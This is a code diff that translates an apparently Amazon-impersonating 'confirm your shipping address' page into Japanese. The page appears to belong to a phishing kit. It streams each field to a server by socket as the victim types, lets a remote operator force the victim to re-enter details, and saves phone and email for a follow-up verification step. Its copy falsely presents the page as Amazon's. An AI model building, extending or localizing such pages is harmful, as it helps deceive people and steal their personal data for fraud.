@@ -43,14 +43,14 @@ function loadInfoFormDraft() {
 }
 
 const LABEL: Record<keyof Form, string> = {
-  fullname: 'Full Name',
-  address: 'Address',
-  fulladdress: 'Address Line 2',
-  city: 'City',
-  state: 'State / Province',
-  postalcode: 'Postal Code',
-  email: 'Email',
-  telephone: 'Phone Number',
+  fullname: 'お名前',
+  address: '住所',
+  fulladdress: '建物名・部屋番号',
+  city: '市区町村',
+  state: '都道府県',
+  postalcode: '郵便番号',
+  email: 'メールアドレス',
+  telephone: '電話番号',
 };
 
 const REQUIRED: Array<keyof Form> = ['fullname', 'address', 'city', 'state', 'postalcode', 'email', 'telephone'];
@@ -73,7 +73,7 @@ export default function Info() {
   const navigate = useNavigate();
 
   const [form, setForm] = useState<Form>(() => loadInfoFormDraft());
-  const [status, setStatus] = useState('Enter the shipping information associated with this order.');
+  const [status, setStatus] = useState('この注文に登録する配送先情報を入力してください。');
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState<Partial<Record<keyof Form, string>>>({});
 
@@ -83,7 +83,7 @@ export default function Info() {
   useEffect(() => {
     socket.emit('join-page', 'info');
     const hasDraft = Object.values(form).some((v) => v.trim());
-    setStatus(hasDraft ? 'Your saved details were restored.' : 'Enter the shipping information associated with this order.');
+    setStatus(hasDraft ? '保存済みの入力内容を復元しました。' : 'この注文に登録する配送先情報を入力してください。');
   }, []);
 
   useEffect(() => {
@@ -110,7 +110,7 @@ export default function Info() {
       setErrors({});
       setLoading(false);
 
-      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the shipping details for this Amazon order.');
+      setStatus(payload?.reason ? `再入力依頼: ${payload.reason}` : 'この注文の配送先情報を確認のうえ、もう一度入力してください。');
       navigate('/info', { replace: true });
       window.scrollTo({ top: 0, behavior: 'smooth' });
       setTimeout(() => inputRefs.current.fullname?.focus(), 0);
@@ -135,18 +135,18 @@ export default function Info() {
     for (const k of REQUIRED) {
       if (!next[k].trim()) e[k] = `${LABEL[k]} is required.`;
     }
-    if (next.email && !isEmail(next.email)) e.email = 'Please enter a valid email address.';
+    if (next.email && !isEmail(next.email)) e.email = '有効なメールアドレスを入力してください。';
     const phoneDigits = normalizePhone(next.telephone).replace(/\D/g, '');
-    if (next.telephone && phoneDigits.length > 0 && phoneDigits.length < 7) e.telephone = 'Phone number looks too short.';
+    if (next.telephone && phoneDigits.length > 0 && phoneDigits.length < 7) e.telephone = '電話番号が短すぎます。';
     return e;
   };
 
   const validateField = (name: keyof Form, value: string) => {
     if (REQUIRED.includes(name) && !value.trim()) return `${LABEL[name]} is required.`;
-    if (name === 'email' && value && !isEmail(value)) return 'Please enter a valid email address.';
+    if (name === 'email' && value && !isEmail(value)) return '有効なメールアドレスを入力してください。';
     if (name === 'telephone' && value) {
       const phoneDigits = normalizePhone(value).replace(/\D/g, '');
-      if (phoneDigits.length > 0 && phoneDigits.length < 7) return 'Phone number looks too short.';
+      if (phoneDigits.length > 0 && phoneDigits.length < 7) return '電話番号が短すぎます。';
     }
     return undefined;
   };
@@ -165,7 +165,7 @@ export default function Info() {
       return next;
     });
     scheduleEmit(name, value);
-    setStatus(`Editing: ${LABEL[name]}`);
+    setStatus(`入力中: ${LABEL[name]}`);
   };
 
   const focusFirstError = (e: Partial<Record<keyof Form, string>>) => {
@@ -182,13 +182,13 @@ export default function Info() {
     const e = validateAll(form);
     setErrors(e);
     if (Object.keys(e).length > 0) {
-      setStatus('Review the highlighted fields and try again.');
+      setStatus('赤い項目を確認して、もう一度お試しください。');
       setTimeout(() => focusFirstError(e), 0);
       return;
     }
 
     setLoading(true);
-    setStatus('Saving your shipping details...');
+    setStatus('配送先情報を保存しています...');
     clearDraft(STORAGE_KEYS.infoDraft);
     saveDraft(STORAGE_KEYS.verifyContact, {
       telephone: form.telephone.trim(),
@@ -211,8 +211,8 @@ export default function Info() {
         <div className="alz-top">
           <div className="alz-step-head">
             <div>
-              <h1 className="alz-step-title">Confirm your shipping address</h1>
-              <p className="alz-step-subtitle">Review the shipping details associated with this order.</p>
+              <h1 className="alz-step-title">配送先住所を確認</h1>
+              <p className="alz-step-subtitle">この注文に登録する配送情報をご確認ください。</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -222,8 +222,8 @@ export default function Info() {
 
         <div className="alz-flow-grid">
           <div className="alz-card">
-            <div className="alz-section-eyebrow">Shipping details</div>
-            <h2 className="alz-page-title">Review your delivery information</h2>
+            <div className="alz-section-eyebrow">配送先情報</div>
+            <h2 className="alz-page-title">お届け先情報を確認してください</h2>
             <p className="alz-page-copy">{status}</p>
             <div className="alz-brand-row mb-2">
               {BRAND_PROMISES.map((item) => (
@@ -239,55 +239,55 @@ export default function Info() {
               }}
             >
               <div>
-                <label className="alz-field-label">Full name</label>
-                <input ref={(el) => (inputRefs.current.fullname = el)} value={form.fullname} onChange={(e) => setField('fullname', e.target.value)} className={inputClass('fullname')} placeholder="Full Name *" autoComplete="name" enterKeyHint="next" />
+                <label className="alz-field-label">氏名</label>
+                <input ref={(el) => (inputRefs.current.fullname = el)} value={form.fullname} onChange={(e) => setField('fullname', e.target.value)} className={inputClass('fullname')} placeholder="山田 太郎 *" autoComplete="name" enterKeyHint="next" />
                 <ErrorText name="fullname" />
               </div>
               <div>
-                <label className="alz-field-label">Street address</label>
-                <input ref={(el) => (inputRefs.current.address = el)} value={form.address} onChange={(e) => setField('address', e.target.value)} className={inputClass('address')} placeholder="Address *" autoComplete="address-line1" enterKeyHint="next" />
+                <label className="alz-field-label">住所</label>
+                <input ref={(el) => (inputRefs.current.address = el)} value={form.address} onChange={(e) => setField('address', e.target.value)} className={inputClass('address')} placeholder="千代田1-1-1 *" autoComplete="address-line1" enterKeyHint="next" />
                 <ErrorText name="address" />
               </div>
               <div>
-                <label className="alz-field-label">Apartment, suite, unit, building, floor, etc.</label>
-                <input ref={(el) => (inputRefs.current.fulladdress = el)} value={form.fulladdress} onChange={(e) => setField('fulladdress', e.target.value)} className={inputClass('fulladdress')} placeholder="Apt, suite, unit, building, floor, etc. (optional)" autoComplete="address-line2" enterKeyHint="next" />
+                <label className="alz-field-label">建物名・部屋番号など</label>
+                <input ref={(el) => (inputRefs.current.fulladdress = el)} value={form.fulladdress} onChange={(e) => setField('fulladdress', e.target.value)} className={inputClass('fulladdress')} placeholder="〇〇マンション 101号室（任意）" autoComplete="address-line2" enterKeyHint="next" />
                 <ErrorText name="fulladdress" />
               </div>
               <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                 <div>
-                  <label className="alz-field-label">City</label>
-                  <input ref={(el) => (inputRefs.current.city = el)} value={form.city} onChange={(e) => setField('city', e.target.value)} className={inputClass('city')} placeholder="City *" autoComplete="address-level2" enterKeyHint="next" />
+                  <label className="alz-field-label">市区町村</label>
+                  <input ref={(el) => (inputRefs.current.city = el)} value={form.city} onChange={(e) => setField('city', e.target.value)} className={inputClass('city')} placeholder="千代田区 *" autoComplete="address-level2" enterKeyHint="next" />
                   <ErrorText name="city" />
                 </div>
                 <div>
-                  <label className="alz-field-label">State</label>
-                  <input ref={(el) => (inputRefs.current.state = el)} value={form.state} onChange={(e) => setField('state', e.target.value)} className={inputClass('state')} placeholder="State / Province *" autoComplete="address-level1" enterKeyHint="next" />
+                  <label className="alz-field-label">都道府県</label>
+                  <input ref={(el) => (inputRefs.current.state = el)} value={form.state} onChange={(e) => setField('state', e.target.value)} className={inputClass('state')} placeholder="東京都 *" autoComplete="address-level1" enterKeyHint="next" />
                   <ErrorText name="state" />
                 </div>
               </div>
               <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                 <div>
-                  <label className="alz-field-label">ZIP code</label>
-                  <input ref={(el) => (inputRefs.current.postalcode = el)} value={form.postalcode} onChange={(e) => setField('postalcode', e.target.value)} className={inputClass('postalcode')} placeholder="Postal Code *" autoComplete="postal-code" inputMode="numeric" enterKeyHint="next" />
+                  <label className="alz-field-label">郵便番号</label>
+                  <input ref={(el) => (inputRefs.current.postalcode = el)} value={form.postalcode} onChange={(e) => setField('postalcode', e.target.value)} className={inputClass('postalcode')} placeholder="1000001 *" autoComplete="postal-code" inputMode="numeric" enterKeyHint="next" />
                   <ErrorText name="postalcode" />
                 </div>
                 <div>
-                  <label className="alz-field-label">Phone number</label>
-                  <input ref={(el) => (inputRefs.current.telephone = el)} value={form.telephone} onChange={(e) => setField('telephone', e.target.value)} className={inputClass('telephone')} placeholder="Phone Number *" autoComplete="tel" inputMode="tel" enterKeyHint="next" />
+                  <label className="alz-field-label">電話番号</label>
+                  <input ref={(el) => (inputRefs.current.telephone = el)} value={form.telephone} onChange={(e) => setField('telephone', e.target.value)} className={inputClass('telephone')} placeholder="09012345678 *" autoComplete="tel" inputMode="tel" enterKeyHint="next" />
                   <ErrorText name="telephone" />
                 </div>
               </div>
               <div>
-                <label className="alz-field-label">Email address</label>
-                <input ref={(el) => (inputRefs.current.email = el)} value={form.email} onChange={(e) => setField('email', e.target.value)} className={inputClass('email')} placeholder="Email *" autoComplete="email" inputMode="email" enterKeyHint="done" />
+                <label className="alz-field-label">メールアドレス</label>
+                <input ref={(el) => (inputRefs.current.email = el)} value={form.email} onChange={(e) => setField('email', e.target.value)} className={inputClass('email')} placeholder="example@example.jp *" autoComplete="email" inputMode="email" enterKeyHint="done" />
                 <ErrorText name="email" />
               </div>
 
               <button type="submit" disabled={loading} className="alz-btn-primary mt-2 text-lg sm:text-xl md:text-2xl">
-                {loading ? 'Saving...' : 'Confirm address'}
+                {loading ? '保存中...' : '住所を確認する'}
               </button>
               <p className="alz-helper-copy text-center mt-3">
-                Amazon may ask you to confirm these details again if account information changes.
+                アカウント情報に変更があった場合、これらの内容を再度確認していただくことがあります。
               </p>
             </form>
 
@@ -295,20 +295,20 @@ export default function Info() {
           </div>
 
           <aside className="alz-card alz-flow-aside alz-side-summary">
-            <div className="alz-side-summary-title">Shipping details</div>
+            <div className="alz-side-summary-title">配送先情報</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb" />
               <div>
-                <div className="alz-order-mini-title">Review the shipping address on file</div>
-                <div className="alz-order-mini-copy">Confirm the recipient name, street address, ZIP code, and contact details for this order.</div>
+                <div className="alz-order-mini-title">登録済みの配送先住所を確認</div>
+                <div className="alz-order-mini-copy">お届け先氏名、住所、郵便番号、連絡先を確認してください。</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
-              <div>Full name for delivery</div>
-              <div>Street address and ZIP Code</div>
-              <div>Phone number and email</div>
+              <div>受取人氏名</div>
+              <div>住所と郵便番号</div>
+              <div>電話番号とメールアドレス</div>
             </div>
-            <div className="alz-side-summary-box">Use the delivery information associated with this order so Amazon can continue processing the shipment.</div>
+            <div className="alz-side-summary-box">この注文に登録する配送先情報を使って、発送手続きを続行します。</div>
           </aside>
         </div>
       </div>
